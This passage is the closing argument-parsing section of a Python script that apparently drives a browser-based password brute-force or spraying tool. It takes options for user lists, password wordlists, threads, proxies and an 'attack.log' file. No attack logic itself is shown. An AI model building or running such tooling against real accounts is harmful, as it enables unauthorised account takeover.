    p.add_argument("-U", "--username", help="Single email/username")
    p.add_argument("--userlist", help="Email list file")
    p.add_argument("-w", "--wordlist", help="Password wordlist")
    p.add_argument("-t", "--threads", type=int, default=5, help="Threads")
    p.add_argument("-d", "--delay", type=float, default=0.3, help="Delay")
    p.add_argument("--proxy", help="Proxy")
    p.add_argument("--log-file", default="attack.log", help="Log file")
    p.add_argument("--detect-only", action="store_true", help="Only detect")
    p.add_argument("--visible", action="store_true", help="Show browser")
    p.add_argument("--no-register", action="store_true", help="Disable auto-register fallback")
    args = p.parse_args()
    
    asyncio.run(async_main(args))

if __name__ == "__main__":
    main()